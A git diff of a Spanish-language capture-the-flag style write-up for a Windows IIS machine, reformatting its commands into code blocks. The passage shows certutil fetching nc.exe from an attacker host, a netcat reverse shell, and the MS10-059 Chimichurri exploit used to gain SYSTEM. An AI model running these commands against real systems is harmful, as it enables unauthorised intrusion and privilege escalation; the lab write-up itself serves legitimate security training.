@@ -91,7 +91,17 @@ De acuerdo a la tecnología empleada se buscó cargar una webshell de `asp` para
 
 ![Carga de archivos](images/exploit_1.png)
 
-Por lo que después de la carga del binario de netcat mediante `certutil.exe -f -urlcache http://10.10.14.16/nc.exe c:\windows\temp\nc.exe`, se obtuvo una reverse shell como `iis apppool\web` entablandola con `c:\windows\temp\nc.exe -e cmd.exe 10.10.14.16 1234`.
+Por lo que después de la carga del binario de netcat mediante:
+
+```powershell
+certutil.exe -f -urlcache http://10.10.14.16/nc.exe c:\windows\temp\nc.exe
+```
+
+Se obtuvo una reverse shell como `iis apppool\web` entablandola con:
+
+```powershell
+c:\windows\temp\nc.exe -e cmd.exe 10.10.14.16 1234
+```
 
 ![Carga de nc.exe](images/exploit_2.png)
 
@@ -113,7 +123,11 @@ Al identificar mediante `systeminfo` que se trataba de una versión vieja de Win
 
 Después de ocupar el [repositorio de exploits de kernel de windows](https://github.com/SecWiki/windows-kernel-exploits) para buscar alguno que fuera a la par de la fecha y acorde a la versión del sistema operativo, se encontró que el exploit relacionado a `MS10-59` era operativo pero debido a que el presente en el repositorio es presentado mediante una prueba de concepto la cual retorna una shell lanzando otro proceso/ventana y no en la presente a donde se ejecuta.
 
-Se optó por buscar alguna otra prueba de concepto que permitiera otro enfoque, encontrando así otro [repositorio del mismo exploit](https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri/Compiled) el cuál mediante la especificación de la IP de escucha y puerto permite entablar una reverse shell como `nt authority\system`, obteniendola mediante `.\churri.exe 10.10.14.16 4321`.
+Se optó por buscar alguna otra prueba de concepto que permitiera otro enfoque, encontrando así otro [repositorio del mismo exploit](https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri/Compiled) el cuál mediante la especificación de la IP de escucha y puerto permite entablar una reverse shell como `nt authority\system`, obteniendola mediante:
+
+```powershell
+.\churri.exe 10.10.14.16 4321
+```
 
 ![Acceso como nt authority\system](images/post_2.png)
 
